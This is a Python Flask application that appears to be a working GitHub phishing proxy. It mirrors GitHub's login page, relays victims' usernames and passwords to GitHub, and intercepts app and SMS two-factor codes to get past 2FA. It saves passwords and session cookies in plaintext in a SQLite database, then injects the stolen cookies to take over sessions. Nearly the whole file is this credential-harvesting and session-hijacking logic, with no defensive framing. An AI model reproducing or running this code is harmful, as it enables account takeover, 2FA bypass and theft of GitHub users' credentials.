from flask import Flask, request, render_template, redirect, session as flask_session, make_response
from scripts.login import get_login_page, perform_login, perform_2fa, execute_2fa_otp, forward_sms, send_sms
from dotenv import load_dotenv
from injector.inject_cookie import inject_and_verify_github_cookies
import os
import sqlite3


app = Flask(__name__)

load_dotenv()

app.secret_key = os.getenv("APP_SECRET_KEY")


@app.route("/", methods=["GET"])
def home():
    html_content = get_login_page()
    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(html_content)
    return render_template("index.html", github_login=html_content)

@app.route("/password_reset", methods=["GET"])
def forgot_password():
    return redirect("https://github.com/password_reset")

@app.route("/signup", methods=["GET"])
def signup():
    source = request.args.get("source")
    return redirect("https://github.com/signup?source=login")


@app.route("/session", methods=["POST"])
def session():
    username = request.form.get("login")
    password = request.form.get("password")

    response_html, success, cookies = perform_login(username, password)

    flask_session["username"] = username
    flask_session["password"] = password

    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    if success == "success":
        cookies_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        cursor.execute("""
        INSERT OR REPLACE INTO users (username, password, cookies, authenticity_token)
        VALUES (?, ?, ?, ?)
        """, (username, password, cookies_str, flask_session.get("authenticity_token")))

        conn.commit()
        conn.close()

        response = make_response(
            render_template("index.html", github_login=response_html)
        )
        for cookie_name, cookie_value in cookies.items():
            response.set_cookie(
                cookie_name,
                cookie_value,
                domain=".github.com" if cookie_name != "__Host-user_session_same_site" else "",
                path="/"
            )

        return response

    conn.close()
    return render_template("index.html", github_login=response_html), 200

@app.route("/sessions/two-factor/app", methods=["GET"])
def two_fa():

    response_html = perform_2fa()

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    return render_template("index.html", github_login=response_html)


@app.route("/sessions/two-factor/sms/confirm", methods=["GET"])
def redirect_sms():
    response_html = forward_sms()

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    return render_template("index.html", github_login=response_html)


@app.route("/sessions/two-factor/sms/confirm", methods=["POST"])
def confirm_send_sms():
    authenticity_token = request.form.get("authenticity_token")
    resend = request.form.get("resend")

    response_html = send_sms(authenticity_token, resend)

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    return render_template("index.html", github_login=response_html)


@app.route("/sessions/two-factor", methods=["POST"])
def post_two_fa():
    app_otp = request.form.get("app_otp")
    sms_otp = request.form.get("sms_otp")

    if not app_otp and not sms_otp:
        return "Missing OTP", 400

    # Determine which function to call based on the OTP type
    if app_otp:
        response_html, status, cookies = execute_2fa_otp(app_otp, "otp")
    elif sms_otp:
        response_html, status, cookies = execute_2fa_otp(sms_otp, "sms_otp")

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    if status == "success":
        cookies_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        cookies_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        cursor.execute(
            """
        INSERT OR REPLACE INTO users (username, password, cookies, authenticity_token)
        VALUES (?, ?, ?, ?)
        """,
            (flask_session.get("username"), flask_session.get("password"), cookies_str, flask_session.get("authenticity_token")),
        )

        conn.commit()
        conn.close()

        inject_and_verify_github_cookies(cookies)

        response = make_response(
            render_template("index.html", github_login=response_html)
        )
        for cookie_name, cookie_value in cookies.items():
            response.set_cookie(
                cookie_name,
                cookie_value,
                domain=".github.com",
                path="/",
                samesite="None",  
                secure=True, 
            )

        return response
    conn.close()
    return render_template("index.html", github_login=response_html)

if __name__ == "__main__":
    app.run(debug=True)
